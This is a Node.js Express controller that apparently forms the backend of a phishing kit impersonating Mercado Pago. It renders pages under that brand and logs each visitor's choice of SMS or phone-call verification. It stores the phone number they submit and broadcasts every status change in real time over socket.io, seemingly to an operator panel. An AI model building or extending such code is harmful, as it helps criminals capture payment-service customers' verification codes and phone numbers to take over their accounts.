const Client = require('../../models/Client')
const { clientsSocket, connectedUsers } = require('../../server')

module.exports = {
    async view(req, res) {
        try {
            //Client

            const { client_id } = req.params

            const { error } = req.query

            const client = await Client.findByPk(client_id)

            if (!client) return res.redirect(`/modules/conta`)

            client.update({ status: `Escolheu SMS` })

            req.app.io.emit('updateClient', client.toJSON())

            return res.render('pages/sms', {
                title: 'Mercado pago',
                pageClasses: 'password cadastro',
                client: client.toJSON(),
                sms: true,
                error: error ? true : false,
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
    async phone(req, res) {
        try {
            //Client

            const { client_id } = req.params

            const { error } = req.query

            const client = await Client.findByPk(client_id)

            if (!client) return res.redirect(`/modules/conta`)

            client.update({ status: `Escolheu Ligação` })

            req.app.io.emit('updateClient', client.toJSON())

            return res.render('pages/sms', {
                title: 'Mercado pago',
                pageClasses: 'password cadastro',
                client: client.toJSON(),
                error: error ? true : false,
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
    async update(req, res) {
        try {
            //Client

            const { client_id } = req.params

            const { phone } = req.body

            const client = await Client.findByPk(client_id)

            if (!client) return res.status(400).send({ error: `Usuário não existe` })

            await client.update({ status: `Enviou código`, phone })

            req.app.io.emit('updateClient', client.toJSON())

            return res.json(client)
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
